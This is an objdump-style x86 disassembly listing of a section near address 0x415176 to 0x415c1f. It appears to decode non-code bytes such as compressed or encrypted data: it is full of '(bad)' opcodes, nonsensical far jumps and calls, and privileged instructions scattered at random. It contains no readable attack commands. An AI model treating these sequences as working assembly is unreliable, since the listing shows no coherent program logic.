  415176:	mov    al,ds:0x8665c4a9
  41517b:	inc    ebp
  41517c:	bound  eax,QWORD PTR [edx-0x681610d7]
  415182:	and    eax,0xf1dac3db
  415187:	xor    cl,dh
  415189:	pop    ecx
  41518a:	hlt    
  41518b:	push   ds
  41518c:	ror    BYTE PTR [ebx],1
  41518e:	rcl    DWORD PTR [eax+0x26791d17],1
  415194:	imul   esp,edx,0xddaaf1ba
  41519a:	jmp    0x796c:0x8bf9b003
  4151a1:	jg     0x415167
  4151a3:	fucomp st(7)
  4151a5:	loope  0x415141
  4151a7:	mov    BYTE PTR [edx-0x2ea212d5],cl
  4151ad:	cmp    eax,0xca6ba241
  4151b2:	pop    ds
  4151b3:	sub    eax,0x7d65eb43
  4151b8:	jg     0x4151dc
  4151ba:	call   0xdd92:0x64a24629
  4151c1:	push   0x7d6fcf9
  4151c6:	jmp    0x44370a15
  4151cb:	sar    DWORD PTR [edi+0x7c3929e],0x5b
  4151d2:	arpl   di,bx
  4151d4:	shl    BYTE PTR [eax],0xa3
  4151d7:	imul   ecx,DWORD PTR [edx],0xd71462bf
  4151dd:	fcomp  st(0)
  4151df:	lock xchg ebp,eax
  4151e1:	or     eax,0x3678354
  4151e6:	scas   al,BYTE PTR es:[edi]
  4151e7:	inc    edi
  4151e8:	pop    esi
  4151e9:	ins    BYTE PTR es:[edi],dx
  4151ea:	sbb    al,0x65
  4151ec:	shl    ch,0x96
  4151ef:	cmp    al,0xfe
  4151f1:	jle    0x41525b
  4151f3:	mov    dl,0x76
  4151f5:	loopne 0x41521b
  4151f7:	mov    ?,WORD PTR [esi]
  4151f9:	jnp    0x4151d9
  4151fb:	bound  esp,QWORD PTR [ecx+0x2e80a2b7]
  415201:	push   eax
  415202:	cmp    al,0x7f
  415204:	call   0x6e75946d
  415209:	cmp    edi,DWORD PTR [ebx-0x5f]
  41520c:	aaa    
  41520d:	push   esp
  41520e:	or     al,0x70
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xc5ddcd0b
  415283:	test   eax,0xdf10
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	gs daa 
  41528e:	int    0x6
  415290:	or     al,0xab
  415292:	int3   
  415293:	mov    esp,0xbb9ff37b
  415298:	jnp    0x41529c
  41529a:	sbb    esp,DWORD PTR [eax-0x3b]
  41529d:	jnp    0x41529d
  41529f:	ins    DWORD PTR es:[edi],dx
  4152a0:	push   esp
  4152a1:	push   eax
  4152a2:	adc    BYTE PTR [eax-0x7f],cl
  4152a5:	or     al,0xd6
  4152a7:	push   ebx
  4152a8:	push   edx
  4152a9:	in     eax,0x6c
  4152ab:	sub    ebx,DWORD PTR [esi]
  4152ad:	mov    ah,0xaf
  4152b0:	push   ds
  4152b1:	call   0x220e5f72
  4152b6:	cs loop 0x41523a
  4152b9:	mov    WORD PTR [ecx-0x30511ecc],ds
  4152bf:	push   0x7505d0d
  4152c4:	arpl   WORD PTR [ecx-0x34],di
  4152c7:	fmul   QWORD PTR [eax+edi*2+0xb]
  4152cb:	add    ah,dh
  4152cd:	add    DWORD PTR [ebx+0xb6480fb],esi
  4152d3:	addr16 xor eax,esp
  4152d6:	mov    edi,0x9ffb982a
  4152db:	shl    BYTE PTR [ecx+0x1e],cl
  4152de:	sub    dh,dl
  4152e0:	or     al,0xb0
  4152e2:	and    bh,dl
  4152e4:	fld    TBYTE PTR ds:0x8e8480d5
  4152ea:	jmp    0xca70a3bb
  4152ef:	outs   dx,BYTE PTR ds:[esi]
  4152f1:	and    bh,BYTE PTR [ecx]
  4152f3:	into   
  4152f4:	mov    BYTE PTR [bx+si],cl
  4152f7:	inc    ecx
  4152f8:	(bad)  
  4152f9:	cld    
  4152fa:	jg     0x41536f
  4152fc:	sbb    DWORD PTR [ebx-0xf],eax
  4152ff:	pop    esi
  415300:	ret    
  415301:	fisttp DWORD PTR [edi+0x33]
  415304:	icebp  
  415305:	ja     0x4152f1
  415307:	jl     0x4152e1
  415309:	call   0xb0481ae3
  41530e:	call   0xc3d9:0xe1a2edc1
  415315:	mov    al,0x39
  415317:	dec    esp
  415318:	and    cl,BYTE PTR [edi+edi*1]
  41531b:	out    dx,eax
  41531c:	jl     0x41533d
  41531e:	hlt    
  41531f:	mov    eax,0x23cd03b8
  415324:	xor    cl,ch
  415326:	xchg   BYTE PTR [ecx-0x11e48fda],al
  41532c:	jmp    0x51f97ade
  415331:	sbb    bh,BYTE PTR [ebp+0x4b]
  415334:	sbb    bh,BYTE PTR [edi]
  415336:	test   bl,ch
  415338:	sub    bl,ah
  41533a:	gs dec ebx
  41533c:	out    dx,al
  41533d:	fcom   DWORD PTR [edx+0x1a792e0]
  415343:	lea    eax,[edi+0x6f3c366e]
  415349:	sub    eax,0x41fe15f4
  41534e:	(bad)  
  41534f:	std    
  415350:	add    BYTE PTR [eax+0x65],dh
  415353:	or     dh,BYTE PTR [edx]
  415355:	jg     0x41538d
  415357:	lds    esp,FWORD PTR [edx+0x588bc85e]
  41535d:	retf   0x9ec4
  415360:	(bad)  
  415361:	xlat   BYTE PTR ds:[ebx]
  415362:	popa   
  415363:	je     0x415302
  415365:	pop    edi
  415366:	pop    edi
  415367:	mov    al,BYTE PTR [edi-0x19]
  41536a:	aam    0x49
  41536c:	outs   dx,DWORD PTR ds:[esi]
  41536d:	sub    cl,BYTE PTR [edx-0x9286c3b]
  415373:	mov    ds:0xdd2002c,eax
  415378:	lock push eax
  41537a:	cmc    
  41537b:	jno    0x415342
  41537d:	sbb    al,0xe0
  41537f:	mov    dl,0x10
  415381:	ins    BYTE PTR es:[edi],dx
  415382:	rcl    bh,0xfe
  415385:	jbe    0x4153b3
  415387:	int3   
  415388:	adc    ebx,DWORD PTR [ecx+0x79]
  41538b:	jecxz  0x415355
  41538d:	dec    ecx
  41538e:	(bad)  
  41538f:	add    eax,0x0
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xdad3e5b0
  415401:	dec    edi
  415402:	sti    
  415403:	jns    0x415419
  415405:	loopne 0x415407
  415407:	add    BYTE PTR [ecx+eax*1],al
  41540a:	add    BYTE PTR [eax],al
  41540c:	push   cx
  41540e:	jl     0x415425
  415410:	das    
  415411:	sub    al,0x2e
  415413:	popf   
  415414:	cli    
  415415:	fsubr  st(0),st
  415417:	ret    0x1558
  41541a:	out    0xc8,eax
  41541c:	mov    dh,0x7b
  41541e:	in     eax,dx
  41541f:	mov    ch,0x16
  415421:	pop    ss
  415422:	fsub   QWORD PTR [ecx]
  415424:	lea    ecx,[edi+0x17]
  415427:	and    BYTE PTR [edi],dh
  415429:	and    dl,BYTE PTR [edx+0x57ec23d3]
  41542f:	pop    es
  415430:	clc    
  415431:	mov    ebx,0x4ef1b370
  415436:	and    al,0xaa
  415438:	sbb    BYTE PTR [esi-0x624224b1],cl
  41543e:	pop    ds
  41543f:	icebp  
  415440:	rcr    dl,0xdc
  415443:	pop    ecx
  415444:	ins    DWORD PTR es:[edi],dx
  415445:	mov    bl,0x69
  415447:	rol    DWORD PTR [edi-0x3c14a139],cl
  41544d:	push   edi
  41544e:	mov    ebp,0xf22fc83a
  415453:	sbb    eax,DWORD PTR [edx]
  415455:	test   ah,ah
  415457:	or     eax,0x735c40b4
  41545c:	(bad)  
  41545d:	(bad)  
  41545e:	ds in  al,0xda
  415461:	cmp    esp,esp
  415463:	int3   
  415464:	and    ebx,ebx
  415466:	fwait
  415467:	cmp    esi,0x510f45bf
  41546d:	jmp    0xdbaa:0x3961469c
  415474:	jbe    0x4154dc
  415476:	adc    al,0x62
  415478:	aad    0xb5
  41547a:	nop
  41547b:	pop    es
  41547c:	push   ebx
  41547d:	dec    edx
  41547e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41547f:	or     eax,0x36fef645
  415484:	sbb    eax,0x837dc137
  415489:	loope  0x415486
  41548b:	pop    ss
  41548c:	sbb    eax,0x831d8887
  415491:	push   ss
  415492:	loope  0x415478
  415494:	repz dec ebp
  415496:	dec    ebp
  415497:	push   eax
  415498:	xchg   edx,eax
  415499:	ret    
  41549a:	xchg   ebx,eax
  41549b:	sub    al,0xc8
  41549d:	rcl    DWORD PTR [ebx-0x7c],1
  4154a0:	leave  
  4154a1:	popa   
  4154a2:	fcmovb st,st(4)
  4154a4:	fld    TBYTE PTR cs:[ebx+0x5a]
  4154a8:	test   al,0x96
  4154aa:	dec    ebx
  4154ab:	mov    ah,BYTE PTR [ebp-0x70]
  4154ae:	pop    edi
  4154af:	sub    eax,0xfccf1c0d
  4154b4:	pop    ecx
  4154b5:	mov    DWORD PTR [edi-0x4405e2e],esp
  4154bb:	pop    edi
  4154bc:	clc    
  4154bd:	fnsave [ecx]
  4154bf:	xchg   edx,eax
  4154c0:	(bad)  
  4154c1:	jp     0x4154c4
  4154c3:	mov    esp,0xbe82d985
  4154c8:	adc    DWORD PTR [esi+0x1153751e],edi
  4154ce:	jecxz  0x4154d5
  4154d0:	cli    
  4154d1:	enter  0x63c0,0x20
  4154d5:	dec    edi
  4154d6:	push   ds
  4154d7:	retf   0x5853
  4154da:	(bad)  
  4154db:	adc    bh,0x3
  4154de:	pop    ebx
  4154df:	xchg   ebp,eax
  4154e0:	cmp    DWORD PTR [ecx-0x79df8f9c],ecx
  4154e6:	jmp    FWORD PTR [ebp-0x4e]
  4154e9:	aaa    
  4154ea:	fdiv   DWORD PTR [ecx-0x1b]
  4154ed:	es dec esi
  4154ef:	pop    edx
  4154f0:	xchg   edi,eax
  4154f1:	cmp    BYTE PTR [ebx+0x41c259e2],cl
  4154f7:	dec    ebx
  4154f8:	loope  0x4154df
  4154fa:	dec    esp
  4154fb:	mov    ds:0xe85d7976,al
  415500:	lahf   
  415501:	sbb    BYTE PTR gs:[edi-0x2278945e],dh
  415508:	jge    0x4154d7
  41550a:	iret   
  41550b:	sbb    cl,BYTE PTR ds:0x6b3f42
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41555d
  415581:	lea    ebx,[edx+0xe11849]
  415587:	add    BYTE PTR [ecx+eax*1],al
  41558a:	add    BYTE PTR [eax],al
  41558c:	push   esi
  41558d:	sbb    al,0x75
  41558f:	test   bh,dl
  415591:	or     al,0x6c
  415593:	mov    bh,0xb7
  415595:	(bad)
  415598:	fcom   QWORD PTR [ecx-0x548afc6a]
  41559e:	out    dx,eax
  41559f:	adc    eax,0xac1cc5fa
  4155a4:	aas    
  4155a5:	nop    edx
  4155a8:	cli    
  4155a9:	pop    esi
  4155aa:	ds int3 
  4155ac:	jo     0x415596
  4155ae:	(bad)  
  4155b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b2:	pop    ecx
  4155b3:	test   BYTE PTR [edx-0x1],dh
  4155b6:	add    BYTE PTR [ebp-0x2682f20],ch
  4155bc:	arpl   bp,bx
  4155be:	inc    ecx
  4155bf:	cwde   
  4155c0:	mov    esp,0x66b3d56b
  4155c5:	das    
  4155c6:	(bad)  
  4155c7:	out    0x18,al
  4155c9:	and    cl,dl
  4155cb:	fxch   st(0)
  4155cd:	sbb    dh,ah
  4155cf:	lods   eax,DWORD PTR ds:[esi]
  4155d0:	(bad)  
  4155d1:	push   0x88a053e8
  4155d6:	dec    edi
  4155d7:	sub    esi,0x3e
  4155da:	mov    edx,0xbb09c866
  4155df:	adc    bl,bl
  4155e1:	cmp    bh,BYTE PTR [eax-0x219a29d1]
  4155e7:	add    DWORD PTR [edi+0x4b],esi
  4155ea:	mov    cl,0xa7
  4155ec:	or     DWORD PTR [eax],0x15add058
  4155f2:	enter  0x2cd2,0xd8
  4155f6:	div    DWORD PTR [ecx-0x69]
  4155f9:	gs add eax,0x27cfdb15
  4155ff:	pop    es
  415600:	sbb    edx,esi
  415602:	rcl    DWORD PTR [ebp+0x6e9254ff],1
  415608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415609:	(bad)  
  41560a:	jns    0x415624
  41560c:	scas   al,BYTE PTR es:[edi]
  41560d:	or     al,0xe7
  41560f:	out    dx,al
  415610:	icebp  
  415611:	dec    eax
  415612:	mov    ch,0x6e
  415614:	push   ebx
  415615:	adc    eax,0x44bb6f67
  41561b:	mov    cs,esi
  41561d:	mov    gs,WORD PTR [ebx+0x9037ed5]
  415623:	(bad)  
  415624:	cmp    al,0x4d
  415626:	and    al,0xa0
  415628:	fmul   QWORD PTR [eax+0x1c40fe85]
  41562e:	scas   al,BYTE PTR es:[edi]
  41562f:	xchg   ecx,eax
  415630:	mov    esi,0xcb7ae6a6
  415635:	mov    dh,0x4a
  415637:	or     esp,DWORD PTR [edx-0x3b]
  41563a:	pusha  
  41563b:	jne    0x4155d6
  41563d:	mov    eax,ds:0x919e7f86
  415642:	jge    0x415696
  415644:	stc    
  415645:	sub    BYTE PTR [edi+0x5c],0xfe
  415649:	or     ecx,ebp
  41564b:	mov    eax,0xe9c8ed8f
  415650:	lahf   
  415651:	aam    0xfe
  415653:	imul   ecx,DWORD PTR [ecx+edx*2],0x197539bc
  41565a:	add    eax,0xae9da860
  41565f:	shl    bl,0xe3
  415662:	ficom  WORD PTR [ecx+eiz*4+0x7a]
  415666:	xchg   esp,eax
  415667:	fcom   DWORD PTR [ebp-0x2dc410a5]
  41566d:	push   edx
  41566e:	xor    eax,0x1b2c7484
  415673:	ficom  DWORD PTR cs:[edx+0x2e]
  415677:	add    cl,0x19
  41567a:	pop    esp
  41567b:	cli    
  41567c:	hlt    
  41567d:	(bad)  
  41567e:	sti    
  41567f:	cs inc edi
  415681:	mov    esp,0x730a7e8d
  415686:	shl    DWORD PTR [edx-0x14],1
  415689:	ins    BYTE PTR es:[edi],dx
  41568a:	les    eax,FWORD PTR [ecx]
  41568c:	cdq    
  41568d:	and    bl,bl
  41568f:	pop    ebx
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xe3
  415701:	js     0x415731
  415703:	xchg   edx,eax
  415704:	sbb    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	mov    esp,0x42a4d998
  415711:	jmp    0x4156d8
  415713:	sbb    BYTE PTR [ecx-0x93ea32c],ch
  415719:	pop    ebp
  41571a:	mov    al,ds:0x2f63d551
  41571f:	mov    ?,WORD PTR [ebx+0x18]
  415722:	cmp    ah,BYTE PTR [ecx+0x3a69dc6c]
  415728:	lods   al,BYTE PTR ds:[esi]
  415729:	rol    DWORD PTR [edx],0x7d
  41572c:	mov    DWORD PTR [bx+di],esp
  41572f:	push   0x60
  415731:	push   ebp
  415732:	xor    eax,0xf7ccdffe
  415737:	inc    esi
  415738:	mov    esp,0x7673d303
  41573d:	mov    BYTE PTR [eax+0x1ebd62a7],bh
  415743:	arpl   WORD PTR [edi],cx
  415745:	push   esi
  415746:	sub    esi,DWORD PTR [ebx+edi*2-0x47]
  41574a:	push   esp
  41574b:	setle  BYTE PTR [ecx-0x74]
  41574f:	xchg   edx,eax
  415750:	inc    esp
  415751:	xor    al,0x95
  415753:	and    eax,0x78af8bfe
  415758:	and    dl,cl
  41575a:	xchg   edx,eax
  41575b:	push   ecx
  41575c:	fld    DWORD PTR [ebp+esi*1+0x22]
  415760:	rcl    BYTE PTR [ecx-0x24],0xed
  415764:	push   0x4f
  415766:	xchg   ebx,ebx
  415768:	arpl   sp,si
  41576a:	loopne 0x415726
  41576c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41576d:	push   cs
  41576e:	mov    edi,0x7fc69775
  415773:	aas    
  415774:	xor    al,0x64
  415776:	mov    ebp,0x4b758e7
  41577b:	pusha  
  41577c:	pusha  
  41577d:	or     eax,0xa972a60c
  415782:	clc    
  415783:	jb     0x4157a7
  415785:	add    DWORD PTR [bx+di+0x2601],esp
  41578a:	adc    al,0x83
  41578c:	adc    ah,dh
  41578e:	fucomi st,st(0)
  415790:	(bad)  
  415791:	mov    ds:0x2cf6a57e,al
  415796:	and    ebx,0x1a
  415799:	shl    bl,0x2c
  41579c:	push   cs
  41579d:	and    cl,BYTE PTR [ecx+0x7f]
  4157a0:	mov    al,0x6
  4157a2:	add    ecx,DWORD PTR [edx-0x19]
  4157a5:	pop    ebx
  4157a6:	jmp    ecx
  4157a8:	arpl   WORD PTR [ecx],bx
  4157aa:	mov    dl,0x2b
  4157ac:	dec    ebx
  4157ad:	add    eax,0xd7085ad6
  4157b2:	imul   edi,DWORD PTR [ebx],0x74
  4157b5:	xlat   BYTE PTR ds:[ebx]
  4157b6:	jnp    0x4157d7
  4157b8:	and    BYTE PTR [eax+esi*8+0x71cc993],al
  4157bf:	mov    al,BYTE PTR [esi+0x6a]
  4157c2:	fmul   QWORD PTR [ecx+0x2d]
  4157c5:	std    
  4157c6:	dec    ecx
  4157c7:	scas   eax,DWORD PTR es:[edi]
  4157c8:	add    BYTE PTR [ebx+0x21],bh
  4157cb:	hlt    
  4157cc:	and    DWORD PTR [ecx+0x67],0xffb91649
  4157d3:	pop    esp
  4157d4:	test   al,0x8a
  4157d6:	dec    eax
  4157d7:	mov    ebp,DWORD PTR [esi+0x46f4b64f]
  4157dd:	hlt    
  4157de:	call   0x130cab18
  4157e3:	mov    esi,0xda35514d
  4157e8:	add    DWORD PTR [ecx-0x7cd5f8b3],ecx
  4157ee:	inc    ebx
  4157ef:	cwde   
  4157f0:	sti    
  4157f1:	out    dx,al
  4157f2:	inc    ecx
  4157f3:	and    BYTE PTR [ebp-0xdae4553],bl
  4157f9:	adc    esp,ebp
  4157fb:	(bad)  
  4157fc:	ins    DWORD PTR es:[edi],dx
  4157fd:	(bad)  ds:0xd5b236cc
  415803:	add    eax,ebp
  415805:	jmp    0xf8f1262c
  41580a:	xor    eax,0xb718835b
  41580f:	xchg   edi,eax
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcl    DWORD PTR [edi],cl
  415881:	pop    edi
  415882:	xor    DWORD PTR [eax+eiz*1+0x40000e3],ebp
  415889:	add    DWORD PTR [eax],eax
  41588b:	add    BYTE PTR [esi],ah
  41588d:	sub    al,0x9b
  41588f:	out    0xd1,eax
  415891:	push   edx
  415892:	ja     0x415913
  415894:	adc    DWORD PTR [edx-0x42],ebp
  415897:	adc    BYTE PTR [esi+ebx*8+0x2d],0x27
  41589c:	jg     0x415916
  41589e:	popf   
  41589f:	cmp    ebp,DWORD PTR [edx+0x3a3ee2be]
  4158a5:	or     DWORD PTR [edx],edi
  4158a7:	mov    ebx,0x2a109d40
  4158ac:	and    ah,ch
  4158ae:	xchg   edx,eax
  4158af:	xor    eax,0x999ffaaf
  4158b4:	popa   
  4158b5:	xor    al,0xa
  4158b7:	aas    
  4158b8:	mov    eax,0x8455317e
  4158bd:	hlt    
  4158be:	pop    eax
  4158bf:	inc    esi
  4158c0:	pop    ebp
  4158c1:	mov    edx,0x55599bde
  4158c6:	loope  0x415939
  4158c8:	pusha  
  4158c9:	jmp    0xce3d24e9
  4158ce:	and    ebx,DWORD PTR [esi+0x22]
  4158d1:	pop    ecx
  4158d2:	in     eax,dx
  4158d3:	push   eax
  4158d4:	lods   al,BYTE PTR ds:[esi]
  4158d5:	ret    0x3274
  4158d8:	sub    DWORD PTR [ebx+0x5c],0xffffffb3
  4158dc:	xor    esp,DWORD PTR [edi+0x66c0d76d]
  4158e2:	xchg   ecx,eax
  4158e3:	fstp   DWORD PTR [ebx+0x2f]
  4158e6:	data16 mov al,ds:0x41ad8b01
  4158ec:	arpl   dx,sp
  4158ee:	fimul  DWORD PTR [esi+0x70]
  4158f1:	xchg   ebp,eax
  4158f2:	inc    ebp
  4158f3:	jg     0x4158ca
  4158f5:	ret    0x4b22
  4158f8:	inc    edi
  4158f9:	xchg   edi,eax
  4158fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158fb:	push   0x84d4221d
  415900:	jge    0x4158f0
  415902:	and    eax,0xab9ff44e
  415907:	xor    DWORD PTR [eax+ebp*2-0x5],edi
  41590b:	rdmsr  
  41590d:	pmuludq mm3,QWORD PTR [eax+0x17666e24]
  415914:	pop    esi
  415915:	pop    eax
  415916:	xchg   edx,eax
  415917:	fbld   TBYTE PTR [ecx-0x4cdd5483]
  41591d:	push   ebp
  41591e:	sub    bh,BYTE PTR [esi+0x8]
  415921:	push   eax
  415922:	xchg   edx,eax
  415923:	sub    ebx,DWORD PTR [eax]
  415925:	sbb    BYTE PTR [edi+0x78d0c0f9],cl
  41592b:	std    
  41592c:	push   cs
  41592d:	push   ss
  41592e:	and    al,0x12
  415930:	iret   
  415931:	out    0x4e,eax
  415933:	test   eax,0x3e598e4f
  415938:	mov    DWORD PTR [edx+0x3c3bd807],esi
  41593e:	push   DWORD PTR es:[edx]
  415941:	or     eax,0x47c50445
  415946:	arpl   sp,cx
  415948:	fidiv  WORD PTR ds:0xd3fded5
  41594e:	add    al,0xde
  415950:	sub    BYTE PTR [edx+0x37],al
  415953:	and    edx,DWORD PTR [eax]
  415955:	ret    
  415956:	pop    es
  415957:	pop    ebx
  415958:	mov    ebx,0x759f693
  41595d:	and    bl,ah
  41595f:	inc    ebp
  415960:	sub    edi,DWORD PTR [esp+ebx*8-0x384f1ad]
  415967:	adc    al,0x2f
  415969:	bound  ecx,QWORD PTR [edi+0x69015d7b]
  41596f:	jmp    0x41597a
  415971:	stos   DWORD PTR es:[edi],eax
  415972:	dec    edi
  415973:	xchg   DWORD PTR [edi+0x5fb06aa1],esi
  415979:	push   edx
  41597a:	jno    0x415961
  41597c:	add    al,0x3e
  41597e:	lods   eax,DWORD PTR ds:[esi]
  41597f:	repnz loopne 0x415932
  415982:	jl     0x4159a2
  415984:	shrd   DWORD PTR [edi],edx,cl
  415987:	into   
  415988:	push   eax
  415989:	sub    al,0xd1
  41598b:	scas   eax,DWORD PTR es:[edi]
  41598c:	inc    edx
  41598d:	xchg   edi,eax
  41598e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41598f:	loopne 0x415991
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	jns    0x4159c9
  415a02:	sub    DWORD PTR [edi+0xe424],ecx
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	dec    edi
  415a0d:	bound  ecx,QWORD PTR [ebx+0x53]
  415a10:	jae    0x415a8c
  415a12:	inc    eax
  415a13:	sub    bh,BYTE PTR [ebx-0x6d]
  415a16:	popf   
  415a17:	pop    esp
  415a18:	pop    edi
  415a19:	(bad)  
  415a1a:	mov    esi,0x592526b1
  415a1f:	aad    0x98
  415a21:	xor    al,0x70
  415a23:	je     0x4159fd
  415a25:	xor    al,0x1d
  415a27:	test   esp,esi
  415a29:	mov    edx,0xc9bf88a
  415a2e:	loopne 0x415a44
  415a30:	sub    edi,DWORD PTR [esi+0x4d2c0d2e]
  415a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a37:	js     0x415a66
  415a39:	(bad)  
  415a3a:	out    dx,eax
  415a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a3c:	in     al,dx
  415a3d:	cdq    
  415a3e:	and    al,0x63
  415a40:	or     edx,edi
  415a42:	sub    DWORD PTR [eax-0xb],edx
  415a45:	shl    DWORD PTR [eax-0x11588894],0xd5
  415a4c:	jbe    0x415a54
  415a4e:	js     0x415a53
  415a50:	mov    DWORD PTR [ecx+0x24],esi
  415a53:	in     al,dx
  415a54:	mov    ah,0x3c
  415a56:	pop    es
  415a57:	inc    edx
  415a58:	shl    DWORD PTR [ebx+0x3dd944f4],0x63
  415a5f:	call   0x864a:0x3a81a660
  415a66:	mov    esi,0x625e6dd2
  415a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6c:	sbb    esi,DWORD PTR [edx]
  415a6e:	rol    DWORD PTR [edx+0x21],1
  415a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a72:	fwait
  415a73:	sub    eax,0xa35dad84
  415a78:	jl     0x415af4
  415a7a:	adc    cl,BYTE PTR es:[esi+ebx*8-0x6]
  415a7f:	add    DWORD PTR [esi+eiz*4+0x1c97f634],ebx
  415a86:	mov    WORD PTR ss:[eax+0x73],?
  415a8a:	mov    esp,0x306b245c
  415a8f:	ficomp WORD PTR [ebp-0x24faac39]
  415a95:	hlt    
  415a96:	ja     0x415a2a
  415a98:	xchg   ecx,eax
  415a99:	pop    eax
  415a9a:	pop    ds
  415a9b:	test   BYTE PTR [ecx+esi*2],0x81
  415a9f:	mov    ecx,0x1a526dd7
  415aa4:	cmp    bh,BYTE PTR ds:0x2dfea27c
  415aaa:	xor    al,0xbd
  415aac:	xchg   esp,eax
  415aad:	int    0xa1
  415aaf:	xor    edx,DWORD PTR [edx]
  415ab1:	shl    BYTE PTR [ebx],1
  415ab3:	and    ax,cx
  415ab6:	sti    
  415ab7:	or     BYTE PTR [ecx+0x70],dl
  415aba:	dec    ecx
  415abb:	push   eax
  415abc:	test   al,0xc9
  415abe:	mov    esi,0xde4583df
  415ac3:	mov    ss,WORD PTR [esi+0x293c210f]
  415ac9:	or     esi,ecx
  415acb:	and    eax,0x2960fe99
  415ad0:	psubd  mm4,mm0
  415ad3:	call   0xf4e1:0x61580aee
  415ada:	shr    DWORD PTR [ebx-0x4c],0x80
  415ade:	push   0x3
  415ae0:	repnz enter 0x519f,0x98
  415ae5:	adc    BYTE PTR [ebx+0x1],ah
  415ae8:	fcmovne st,st(1)
  415aea:	adc    al,BYTE PTR [esi+0x76]
  415aed:	ror    BYTE PTR [esi],cl
  415aef:	repz std 
  415af1:	fcom   DWORD PTR [esi-0x2eeef931]
  415af7:	mov    edi,0x1b828291
  415afc:	out    0x54,al
  415afe:	cmovne esp,esi
  415b01:	mov    BYTE PTR [ebp+0x73],ch
  415b04:	cmc    
  415b05:	iret   
  415b06:	add    al,0xbd
  415b08:	mov    ebp,0xe1c6be26
  415b0d:	xchg   ebx,eax
  415b0e:	mov    dl,BYTE PTR [ebx+0x0]
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fdiv   QWORD PTR [edx]
  415b81:	in     eax,dx
  415b82:	mov    edx,0xe52872
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	clc    
  415b8d:	mov    esi,0x9cfec5c3
  415b92:	push   ebx
  415b93:	data16 xor ch,BYTE PTR [esi-0x52c0148d]
  415b9a:	test   BYTE PTR [esi],ah
  415b9c:	dec    ebp
  415b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b9e:	iret   
  415b9f:	rol    BYTE PTR [ecx-0x1d],cl
  415ba2:	scas   eax,DWORD PTR es:[edi]
  415ba3:	adc    eax,0x3a9e44b5
  415ba8:	mov    al,ds:0x7df0adbc
  415bad:	cmp    eax,0x4add32cb
  415bb2:	cmp    ah,0x47
  415bb5:	push   ss
  415bb6:	sub    al,0xdd
  415bb8:	int3   
  415bb9:	adc    dl,BYTE PTR ds:0x920c5e6b
  415bbf:	js     0x415baa
  415bc1:	inc    esi
  415bc2:	scas   al,BYTE PTR es:[edi]
  415bc3:	sub    al,BYTE PTR [esi]
  415bc5:	mov    al,0x1e
  415bc7:	popf   
  415bc8:	int    0xd7
  415bca:	ret    
  415bcb:	mov    al,ds:0x4bcdb70c
  415bd0:	scas   al,BYTE PTR es:[edi]
  415bd1:	xor    al,BYTE PTR [eax-0x4448697c]
  415bd7:	daa    
  415bd8:	xchg   DWORD PTR [esi+ecx*8-0x59],ebp
  415bdc:	int    0x2
  415bde:	pop    ecx
  415bdf:	jnp    0x415c26
  415be1:	adc    al,0xef
  415be3:	mov    bh,0x22
  415be5:	ss pop edx
  415be7:	cwde   
  415be8:	icebp  
  415be9:	jnp    0x415b87
  415beb:	lods   al,BYTE PTR ds:[esi]
  415bec:	cmp    eax,0x5a52d97d
  415bf1:	mov    DWORD PTR [edi],esi
  415bf3:	mov    al,0xca
  415bf5:	push   edx
  415bf6:	loopne 0x415bf9
  415bf8:	push   ss
  415bf9:	iret   
  415bfa:	pop    esi
  415bfb:	ja     0x415bc9
  415bfd:	dec    esi
  415bfe:	xchg   DWORD PTR [edx-0x4ce85eec],eax
  415c04:	add    DWORD PTR [esi+0x76],edi
  415c07:	xor    ah,BYTE PTR [ebx]
  415c09:	dec    ebx
  415c0a:	les    ecx,FWORD PTR [edi-0x7b23c820]
  415c10:	add    DWORD PTR [ebp-0x1978e84f],ecx
  415c16:	repz pop esi
  415c18:	sub    al,0xff
  415c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c1b:	daa    
  415c1c:	mov    ah,BYTE PTR [eax+0x7]
  415c1f:	scas   al,BYTE PTR es:[edi]
